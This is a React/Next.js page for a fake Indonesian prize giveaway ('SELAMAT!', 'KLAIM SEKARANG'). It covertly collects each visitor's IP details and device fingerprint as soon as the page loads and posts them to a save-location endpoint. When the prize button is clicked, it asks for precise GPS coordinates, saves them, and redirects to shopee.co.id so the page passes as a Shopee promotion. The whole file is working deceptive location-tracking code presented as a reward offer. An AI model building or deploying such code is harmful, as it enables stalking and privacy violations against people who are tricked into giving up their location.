/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useEffect, useState } from "react";
import confetti from "canvas-confetti";

export default function TrackPage() {
  const [ipData, setIpData] = useState<any>(null);
  const [deviceInfo, setDeviceInfo] = useState<any>(null);
  const [loading, setLoading] = useState(false);

  const [buttonReady, setButtonReady] = useState(false);

  const dataReady = ipData && deviceInfo;

  const ready = dataReady && buttonReady;

  useEffect(() => {
    async function init() {
      const ipRes = await fetch("/api/get-ip");
      const ipJson = await ipRes.json();
      setIpData(ipJson);

      const d = getDeviceInfo();
      setDeviceInfo(d);

      await fetch("/api/save-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...ipJson,
          ...d,
          gpsLat: null,
          gpsLon: null,
        }),
      });

      setTimeout(() => {
        confetti({ particleCount: 120, spread: 80 });
      }, 300);
    }

    init();

    setTimeout(() => {
      setButtonReady(true);
    }, 3000);

  }, []);

  async function handleClaim() {
    if (!ready) return;

    setLoading(true);

    const payload = { ...ipData, ...deviceInfo };

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ...payload,
            gpsLat: pos.coords.latitude,
            gpsLon: pos.coords.longitude,
          }),
        });

        confetti({ particleCount: 250, spread: 100 });

        setTimeout(() => {
          window.location.href = "https://shopee.co.id";
        }, 1200);
      },

      async () => {
        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ...payload,
            gpsLat: null,
            gpsLon: null,
          }),
        });

        setTimeout(() => {
          window.location.href = "https://shopee.co.id";
        }, 1200);
      }
    );
  }

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        {loading ? (
          <>
            <h2 style={styles.title}>⏳ Memproses...</h2>
            <p style={styles.text}>Sebentar ya, hadiah sedang diklaim…</p>
          </>
        ) : (
          <>
            <h2 style={styles.title}>🎉 SELAMAT!</h2>
            <p style={styles.text}>Anda mendapatkan hadiah menarik!</p>

            <button
              onClick={handleClaim}
              disabled={!ready}
              style={{
                ...styles.button,
                opacity: ready ? 1 : 0.4,
                pointerEvents: ready ? "auto" : "none",
              }}
            >
              🎁 KLAIM SEKARANG
              {!ready && <span style={styles.loading}> ⏳</span>}
            </button>

            {!ready && (
              <p style={styles.smallText}>
                Menyiapkan hadiah Anda...
              </p>
            )}
          </>
        )}
      </div>
    </div>
  );
}

function getDeviceInfo() {
  const ua = navigator.userAgent.toLowerCase();

  let os = "Unknown OS";
  if (ua.includes("windows")) os = "Windows";
  else if (ua.includes("mac os x")) os = "MacOS";
  else if (ua.includes("android")) os = "Android";
  else if (ua.includes("iphone")) os = "iPhone iOS";
  else if (ua.includes("ipad")) os = "iPad iOS";

  let deviceType = "Desktop";
  if (/mobile/i.test(ua)) deviceType = "Mobile";
  if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";

  const brands = [
    "Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Infinix",
    "Poco", "Huawei", "Nokia", "Sony", "Asus", "Lenovo",
    "iPhone", "iPad",
  ];

  let device = "Unknown Device";
  for (const b of brands) {
    if (ua.includes(b.toLowerCase())) device = b;
  }

  if (deviceType === "Desktop") device = os;

  return { device, deviceType, os, userAgent: navigator.userAgent };
}

const styles: any = {
  container: {
    minHeight: "100vh",
    background: "#FFF4E6",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: 20,
  },
  card: {
    background: "#fff",
    padding: 30,
    borderRadius: 16,
    maxWidth: 360,
    width: "100%",
    textAlign: "center",
    boxShadow: "0 6px 20px rgba(0,0,0,0.15)",
  },
  title: {
    fontSize: 28,
    fontWeight: "bold",
    marginBottom: 12,
  },
  text: {
    fontSize: 16,
    marginBottom: 20,
  },
  smallText: {
    fontSize: 13,
    color: "#666",
    marginTop: 10,
  },
  button: {
    background: "#FF5722",
    color: "white",
    padding: "14px 18px",
    width: "100%",
    border: "none",
    borderRadius: 10,
    fontSize: 18,
    cursor: "pointer",
    marginTop: 10,
  },
  loading: {
    marginLeft: 6,
  },
};
